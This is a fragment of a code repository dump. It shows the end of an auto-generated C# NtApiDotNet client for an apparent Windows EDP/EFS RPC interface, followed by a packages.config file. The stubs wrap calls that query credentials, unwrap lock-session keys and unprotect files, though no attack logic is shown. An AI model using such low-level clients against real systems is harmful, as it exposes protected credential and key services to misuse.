_Unmarshal_Helper u = SendReceive(23, m);\n            return u.ReadInt32();\n        }\n        public int EdpRpcCredentialCreate(string p0, string p1, string p2, out string p3)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p1, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p2, new System.Action<string>(m.WriteTerminatedString));\n            _Unmarshal_Helper u = SendReceive(24, m);\n            p3 = u.ReadReferent<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            return u.ReadInt32();\n        }\n        public int EdpRpcCredentialQuery(string p0, string p1, string p2, out string p3)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p1, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p2, new System.Action<string>(m.WriteTerminatedString));\n            _Unmarshal_Helper u = SendReceive(25, m);\n            p3 = u.ReadReferent<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            return u.ReadInt32();\n        }\n        public int EdpRpcCredentialExists(string p0, string p1, string p2, out int p3)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p1, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p2, new System.Action<string>(m.WriteTerminatedString));\n            _Unmarshal_Helper u = SendReceive(26, m);\n            p3 = u.ReadInt32();\n            return u.ReadInt32();\n        }\n        public int EdpRpcCredentialDelete(int p0, string p1, string p2, string p3, string p4)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteInt32(p0);\n            m.WriteReferent(p1, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p2, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p3, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p4, new System.Action<string>(m.WriteTerminatedString));\n            _Unmarshal_Helper u = SendReceive(27, m);\n            return u.ReadInt32();\n        }\n        public int EdpRpcQueryRevokedPolicyOwnerIds(string p0, int p1, out string p2)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(p1);\n            _Unmarshal_Helper u = SendReceive(28, m);\n            p2 = u.ReadReferent<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            return u.ReadInt32();\n        }\n        public int EdpRpcQueryDplEnforcedPolicyOwnerIds(string p0, out string p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            _Unmarshal_Helper u = SendReceive(29, m);\n            p1 = u.ReadReferent<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            return u.ReadInt32();\n        }\n        public int EdpRpcGetLockSessionWrappedKey(string p0, sbyte[] p1, int p2, out sbyte[] p3, out int p4, out sbyte[] p5, out int p6)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p1, new System.Action<sbyte[], long>(m.Write_33), p2);\n            m.WriteInt32(p2);\n            _Unmarshal_Helper u = SendReceive(30, m);\n            p3 = u.ReadReferent<sbyte[]>(new System.Func<sbyte[]>(u.Read_34), false);\n            p4 = u.ReadInt32();\n            p5 = u.ReadReferent<sbyte[]>(new System.Func<sbyte[]>(u.Read_35), false);\n            p6 = u.ReadInt32();\n            return u.ReadInt32();\n        }\n        public int EdpRpcGetLockSessionUnwrappedKey(string p0, sbyte[] p1, int p2, sbyte[] p3, int p4, out sbyte[] p5, out int p6)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p1, new System.Action<sbyte[], long>(m.Write_33), p2);\n            m.WriteInt32(p2);\n            m.WriteReferent(p3, new System.Action<sbyte[], long>(m.Write_36), p4);\n            m.WriteInt32(p4);\n            _Unmarshal_Helper u = SendReceive(31, m);\n            p5 = u.ReadReferent<sbyte[]>(new System.Func<sbyte[]>(u.Read_35), false);\n            p6 = u.ReadInt32();\n            return u.ReadInt32();\n        }\n        public int EdpRpcGetCredServiceState(out int p0, out int p1, out int p2, out int p3, out int p4, out int p5, out int p6, out int p7, out int p8)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            _Unmarshal_Helper u = SendReceive(32, m);\n            p0 = u.ReadInt32();\n            p1 = u.ReadInt32();\n            p2 = u.ReadInt32();\n            p3 = u.ReadInt32();\n            p4 = u.ReadInt32();\n            p5 = u.ReadInt32();\n            p6 = u.ReadInt32();\n            p7 = u.ReadInt32();\n            p8 = u.ReadInt32();\n            return u.ReadInt32();\n        }\n        public int EdpRpcDplUpgradePinInfo(string p0, out int p1, out int p2, out int p3)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            _Unmarshal_Helper u = SendReceive(33, m);\n            p1 = u.ReadInt32();\n            p2 = u.ReadInt32();\n            p3 = u.ReadInt32();\n            return u.ReadInt32();\n        }\n        public int EdpRpcDplUpgradeVerifyUser(string p0, string p1, out int p2, out NtApiDotNet.Ndr.Marshal.NdrUInt3264 p3)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p1, new System.Action<string>(m.WriteTerminatedString));\n            _Unmarshal_Helper u = SendReceive(34, m);\n            p2 = u.ReadInt32();\n            p3 = u.ReadUInt3264();\n            return u.ReadInt32();\n        }\n        public int EdpRpcDplUserCredentialsSet(string p0, string p1, NtApiDotNet.Ndr.Marshal.NdrEnum16 p2, NtApiDotNet.Ndr.Marshal.NdrUInt3264 p3)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p1, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEnum16(p2);\n            m.WriteUInt3264(p3);\n            _Unmarshal_Helper u = SendReceive(35, m);\n            return u.ReadInt32();\n        }\n        public int EdpRpcDplUserUnlockStart(string p0, string p1, long p2, out NtApiDotNet.Ndr.Marshal.NdrUInt3264 p3)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p1, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt64(p2);\n            _Unmarshal_Helper u = SendReceive(36, m);\n            p3 = u.ReadUInt3264();\n            return u.ReadInt32();\n        }\n        public int EdpRpcDplUserUnlockComplete(string p0, int p1, NtApiDotNet.Ndr.Marshal.NdrUInt3264 p2)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(p1);\n            m.WriteUInt3264(p2);\n            _Unmarshal_Helper u = SendReceive(37, m);\n            return u.ReadInt32();\n        }\n        public int EdpRpcQueueFileForEncryption(System.Nullable<Struct_13> p0, string p1, string p2, string p3)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<Struct_13>(m.Write_13));\n            m.WriteReferent(p1, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p2, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p3, \"p3\"));\n            _Unmarshal_Helper u = SendReceive(38, m);\n            return u.ReadInt32();\n        }\n        public int EdpRpcServiceFileEncryptionQueue(sbyte p0)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteSByte(p0);\n            _Unmarshal_Helper u = SendReceive(39, m);\n            return u.ReadInt32();\n        }\n        public int EdpRpcCredSvcControl(int p0, string p1, string p2, sbyte[] p3, int p4, sbyte[] p5, int p6, out sbyte[] p7, out int p8)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteInt32(p0);\n            m.WriteReferent(p1, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p2, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteReferent(p3, new System.Action<sbyte[], long>(m.Write_36), p4);\n            m.WriteInt32(p4);\n            m.WriteReferent(p5, new System.Action<sbyte[], long>(m.Write_37), p6);\n            m.WriteInt32(p6);\n            _Unmarshal_Helper u = SendReceive(40, m);\n            p7 = u.ReadReferent<sbyte[]>(new System.Func<sbyte[]>(u.Read_38), false);\n            p8 = u.ReadInt32();\n            return u.ReadInt32();\n        }\n        public int EdpRpcRmsClearKeys()\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            _Unmarshal_Helper u = SendReceive(41, m);\n            return u.ReadInt32();\n        }\n        public int EdpRpcRmsContainerizeFile(string p0, string p1, string p2, string p3, out string p4)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p1, \"p1\"));\n            m.WriteReferent(p2, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p3, \"p3\"));\n            _Unmarshal_Helper u = SendReceive(42, m);\n            p4 = u.ReadReferent<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            return u.ReadInt32();\n        }\n        public int EdpRpcRmsGetContainerIdentity(string p0, out string p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            _Unmarshal_Helper u = SendReceive(43, m);\n            p1 = u.ReadReferent<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            return u.ReadInt32();\n        }\n        public int EdpRpcRmsDecontainerizeFile(string p0, string p1, out string p2)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p1, \"p1\"));\n            _Unmarshal_Helper u = SendReceive(44, m);\n            p2 = u.ReadReferent<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            return u.ReadInt32();\n        }\n        public int EdpRpcAllowFileAccessForProcess(string p0, int p1, string p2)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteInt32(p1);\n            m.WriteReferent(p2, new System.Action<string>(m.WriteTerminatedString));\n            _Unmarshal_Helper u = SendReceive(45, m);\n            return u.ReadInt32();\n        }\n        public int EdpRpcGetTfaCache(out System.Nullable<Struct_14> p0)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            _Unmarshal_Helper u = SendReceive(46, m);\n            p0 = u.ReadReferentValue<Struct_14>(new System.Func<Struct_14>(u.Read_14), false);\n            return u.ReadInt32();\n        }\n        public int EdpRpcUnprotectFile(string p0, int p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteInt32(p1);\n            _Unmarshal_Helper u = SendReceive(47, m);\n            return u.ReadInt32();\n        }\n        public int EdpRpcPurgeAppLearningEvents()\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            _Unmarshal_Helper u = SendReceive(48, m);\n            return u.ReadInt32();\n        }\n        public int OefsRpcCheckSupport(string p0, out int p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            _Unmarshal_Helper u = SendReceive(49, m);\n            p1 = u.ReadInt32();\n            return u.ReadInt32();\n        }\n        public int EdpRpcWriteLogSiteLearningEvents(string p0)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            _Unmarshal_Helper u = SendReceive(50, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcReprotectFile(string p0, string p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p1, \"p1\"));\n            _Unmarshal_Helper u = SendReceive(51, m);\n            return u.ReadInt32();\n        }\n        public int EdpRpcIsConsumerProtectionEnforced(string p0, out int p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<string>(m.WriteTerminatedString));\n            _Unmarshal_Helper u = SendReceive(52, m);\n            p1 = u.ReadInt32();\n            return u.ReadInt32();\n        }\n    }\n    #endregion\n}\n\n"
        },
        {
          "name": "packages.config",
          "type": "blob",
          "size": 0.2294921875,
          "content": "﻿<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<packages>\n  <package id=\"dnMerge\" version=\"0.5.13\" targetFramework=\"net461\" developmentDependency=\"true\" />\n  <package id=\"NtApiDotNet\" version=\"1.1.32\" targetFramework=\"net461\" />\n</packages>"
        }
      ]
    }
  ]
}